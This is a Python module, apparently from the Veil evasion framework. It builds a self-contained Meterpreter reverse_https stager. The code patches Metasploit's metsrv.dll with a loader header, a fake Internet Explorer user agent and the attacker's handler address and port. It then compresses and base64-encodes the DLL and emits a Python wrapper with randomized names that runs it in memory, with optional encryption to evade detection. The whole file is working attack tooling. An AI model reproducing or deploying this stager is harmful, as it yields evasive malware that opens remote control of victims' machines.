"""

Reads in metsrv.dll, patches it with appropriate options for a 
meterpreter reverse_https payload compresses/bas64 encodes it 
and then builds a python injection wrapper to inject the contained 
meterpreter dll into memory.

Concept and module by @the_grayhound

"""

import struct, string, random, sys

from modules.common import messages
from modules.common import randomizer
from modules.common import helpers
from modules.common import crypters
from config import veil


class Stager:
    
    def __init__(self):
        # required options
        self.shortname = "MeterHTTPSContained"
        self.description = "self-contained windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                "use_encrypter" : ["N", "Use an available encrypter"],
                                "LHOST" : ["", "IP of the metasploit handler"],
                                "LPORT" : ["", "Port of the metasploit handler"]}
        
        
    # helper for the metasploit http checksum algorithm
    def checksum8(self, s):
        # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
        return sum([ord(ch) for ch in s]) % 0x100

    # generate a metasploit http handler compatible checksum for the URL
    def genHTTPChecksum(self, value="CONN"):
        checkValue = 0
        if value == "INITW": checkValue = 92 # normal initiation
        if value == "INITJ": checkValue = 88 # not sure...
        else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
        
        chk = string.ascii_letters + string.digits
        for x in xrange(64):
            uri = "".join(random.sample(chk,3))
            r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
            for char in r:
                if self.checksum8(uri + char) == checkValue:
                    return uri + char
                    
    def generate(self):
        
        metsrvPath = veil.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
        
        f = open(metsrvPath, 'rb')
        meterpreterDll = f.read()
        f.close()
        
        # lambda function used for patching the metsvc.dll
        dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]

        # patch the metsrv.dll header

        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x37"
        headerPatch += "\x15\x00\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
        headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
        meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)

        # patch in the default user agent string
        userAgentIndex = meterpreterDll.index("METERPRETER_UA\x00")
        userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
        meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)

        # turn on SSL
        sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
        sslString = "METERPRETER_TRANSPORT_HTTPS\x00"
        meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)

        # replace the URL/port of the handler
        urlIndex = meterpreterDll.index("https://" + ("X" * 256))
        urlString = "https://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + randomizer.randomString(16) + "/\x00"
        meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
        
        # replace the expiration timeout with the default value of 300
        expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
        expirationTimeout = struct.pack('<I', 604800)
        meterpreterDll = dllReplace(meterpreterDll,expirationTimeoutIndex,expirationTimeout)

        # replace the communication timeout with the default value of 300
        communicationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xaf79257f))
        communicationTimeout = struct.pack('<I', 300)
        meterpreterDll = dllReplace(meterpreterDll,communicationTimeoutIndex,communicationTimeout)

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)
        
        # actually build out the payload
        payloadCode = ""
        
        # doing void * cast
        payloadCode += "from ctypes import *\nimport base64,zlib\n"

        randInflateFuncName = randomizer.randomString()
        randb64stringName = randomizer.randomString()
        randVarName = randomizer.randomString()

        # deflate function
        payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
        payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
        payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"

        randVarName = randomizer.randomString()
        randFuncName = randomizer.randomString()
        
        payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
        payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
        payloadCode += randFuncName+"()\n"
        
        if self.required_options["use_encrypter"][0].lower() == "y":
            payloadCode = crypters.pyherion(payloadCode)

        return payloadCode
